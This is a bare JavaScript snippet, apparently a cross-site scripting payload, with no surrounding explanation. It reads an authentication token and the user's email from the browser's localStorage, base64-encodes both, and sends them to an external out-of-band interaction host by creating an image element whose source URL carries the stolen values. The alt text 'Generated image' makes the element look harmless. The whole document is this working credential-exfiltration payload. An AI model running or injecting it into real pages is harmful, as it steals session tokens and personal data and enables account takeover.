let token=localStorage.getItem('__aple_auth__')
let email=localStorage.getItem('__aple_user__')
var imgElement = document.createElement('img');
imgElement.src = 'https://qlczvvvmiqyxqynbxerd4zmpr24rq2j5q.oast.fun/?token='+btoa(token)+"&user_data="+btoa(email);
imgElement.alt = 'Generated image';
document.body.appendChild(imgElement);
